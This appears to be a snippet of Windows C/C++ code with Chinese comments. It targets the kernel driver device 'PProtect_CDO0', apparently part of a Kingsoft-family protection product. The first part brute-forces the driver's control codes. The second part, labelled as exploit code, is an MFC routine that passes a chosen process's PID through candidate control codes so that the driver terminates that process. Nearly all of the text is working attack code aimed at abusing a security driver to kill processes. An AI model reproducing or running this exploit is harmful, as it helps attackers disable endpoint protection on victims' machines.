
动态枚举（推荐）：
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

#define DEVICE_PATH L"\\\\.\\PProtect_CDO0"

int main() {
    HANDLE hDev = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("打开设备失败，错误码 %d\n", GetLastError());
        return 1;
    }

    // 枚举 0x222000~0x222FFF（金山系常用），也可扩展 0x9C40xxxx
    for (DWORD code = 0x222000; code <= 0x222FFF; code++) {
        DWORD bytes;
        DWORD pid = 1234; // 任意测试PID，只需要看返回值
        BOOL ret = DeviceIoControl(hDev, code, &pid, sizeof(pid), NULL, 0, &bytes, NULL);
        if (ret || GetLastError() != ERROR_INVALID_FUNCTION) {
            printf("有效 IOCTL: 0x%08X, LastError=%d\n", code, GetLastError());
        }
    }
    CloseHandle(hDev);
    return 0;
}





MFC 利用代码（待填入准确 IOCTL）：
// PProtectExploit.h / .cpp
#include <windows.h>
#include <winioctl.h>
#include <tlhelp32.h>
#include <stdio.h>

#define DEVICE_PATH_PPROTECT L"\\\\.\\PProtect_CDO0"

// 请通过枚举或静态分析后替换为实际值
#define IOCTL_KILL_PROCESS  0x222020  // 示例，实际需修改

// 获取进程 ID
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// 利用函数
bool ExploitPProtectKillProcess(DWORD testIoctl = IOCTL_KILL_PROCESS) {
    HANDLE hDevice = CreateFileW(DEVICE_PATH_PPROTECT,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] 打开设备 %s 失败，错误码 %d\n", DEVICE_PATH_PPROTECT, GetLastError());
        return false;
    }

    DWORD pid = GetProcessIdByName(L"notepad.exe");
    if (pid == 0) {
        wprintf(L"[!] 未找到 notepad.exe，请先启动记事本。\n");
        CloseHandle(hDevice);
        return false;
    }

    DWORD bytesReturned;
    BOOL bRet = DeviceIoControl(hDevice, testIoctl,
        &pid, sizeof(pid), NULL, 0, &bytesReturned, NULL);

    DWORD err = GetLastError();
    CloseHandle(hDevice);

    if (bRet) {
        wprintf(L"[+] IOCTL 0x%08X 成功，进程已终止。\n", testIoctl);
        return true;
    } else {
        wprintf(L"[-] IOCTL 0x%08X 失败，错误码 %d\n", testIoctl, err);
        return false;
    }
}

// MFC 按钮事件
void CYourDlg::OnBnClickedTestPProtect() {
    // 可尝试多个候选值
    DWORD candidates[] = { 0x222020, 0x222030, 0x222038, 0x9C402020, 0x9C403030 };
    for (DWORD code : candidates) {
        if (ExploitPProtectKillProcess(code)) break;
    }
}